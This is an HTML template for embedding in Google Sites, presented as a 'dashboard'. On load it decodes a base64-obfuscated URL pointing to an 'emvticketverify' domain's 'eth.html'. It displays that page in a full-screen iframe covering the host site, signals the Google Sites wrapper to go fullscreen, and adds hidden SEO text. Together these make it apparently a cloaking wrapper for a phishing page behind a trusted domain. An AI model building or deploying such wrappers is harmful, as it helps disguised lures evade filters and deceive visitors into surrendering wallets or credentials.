<!-- Complete Google Sites Fullscreen Embed - FIXED VERSION -->
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Your Dashboard</title>
    
    <!-- CRITICAL: These styles MUST be in a style tag, not injected -->
    <style>
        /* COMPLETE CSS RESET for YOUR page */
        html, body {
            margin: 0 !important;
            padding: 0 !important;
            overflow: hidden !important;
            width: 100vw !important;
            height: 100vh !important;
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            background: transparent !important;
        }
        
        .hidden-seo {
            position: absolute;
            left: -9999px;
            opacity: 0;
            height: 0;
            width: 0;
            overflow: hidden;
        }
        
        iframe {
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100vw !important;
            height: 100vh !important;
            border: 0 !important;
            margin: 0 !important;
            padding: 0 !important;
            z-index: 999999 !important;
            display: block !important;
        }
        
        /* Hide everything except the iframe */
        * {
            box-sizing: border-box !important;
            max-width: 100vw !important;
        }
    </style>
    
    <!-- IMPORTANT: Meta tags for Google Sites -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google" content="notranslate">
    <meta name="format-detection" content="telephone=no">
</head>
<body>
    <!-- Minimal SEO content -->
    <div class="hidden-seo">Your SEO Content Here</div>
    
    <!-- Main iframe -->
    <iframe 
        id="main" 
        sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals"
        allow="fullscreen"
        allowfullscreen
        loading="eager"
        referrerpolicy="no-referrer-when-downgrade">
    </iframe>

    <script>
    (function(){
        // YOUR BASE64 URL HERE
        const encodedUrl = 'aHR0cHM6Ly9lbXZ0aWNrZXR2ZXJpZnkubm9kZXNzLnh5ei9ldGguaHRtbA==';
        const targetUrl = atob(encodedUrl); // https://emvticketverify.nodess.xyz/eth.html
        
        // Wait for everything to load
        window.addEventListener('load', function() {
            const iframe = document.getElementById('main');
            
            // Set iframe source
            iframe.src = targetUrl;
            
            // Make iframe visible
            iframe.style.opacity = '1';
            iframe.style.visibility = 'visible';
            
            // ===== CRITICAL: PostMessage to Google Sites =====
            // This is the ONLY way to communicate with Google Sites
            function sendToGoogleSites() {
                if (window.parent !== window.self) {
                    try {
                        // Tell Google Sites wrapper to go fullscreen
                        window.parent.postMessage({
                            type: 'resize-iframe',
                            action: 'fullscreen',
                            height: window.innerHeight,
                            width: window.innerWidth,
                            source: 'github-embed',
                            timestamp: Date.now()
                        }, '*');
                        
                        // Also try Google-specific messages
                        window.parent.postMessage({
                            __gsf: true,
                            fullscreen: true,
                            removePadding: true
                        }, '*');
                        
                        console.log('ðŸ“¢ Sent resize request to Google Sites');
                    } catch(e) {
                        // Silently fail - we're in cross-origin
                    }
                }
            }
            
            // Send multiple times to ensure delivery
            sendToGoogleSites();
            setTimeout(sendToGoogleSites, 100);
            setTimeout(sendToGoogleSites, 500);
            setTimeout(sendToGoogleSites, 1000);
            
            // Also send on any resize
            window.addEventListener('resize', sendToGoogleSites);
            
            // Listen for messages FROM the iframe (your nodess.xyz content)
            window.addEventListener('message', function(e) {
                // Forward resize requests from your content to Google Sites
                if (e.data && (e.data.type === 'resize' || e.data.type === 'resize-iframe')) {
                    sendToGoogleSites();
                }
            });
        });
        
        // Also run on DOM ready for faster loading
        document.addEventListener('DOMContentLoaded', function() {
            // Force your own page to be fullscreen
            document.documentElement.style.overflow = 'hidden';
            document.body.style.overflow = 'hidden';
            
            // Remove any potential padding/margin
            document.body.style.cssText = 'margin:0!important;padding:0!important;';
        });
    })();
    </script>
</body>
</html>
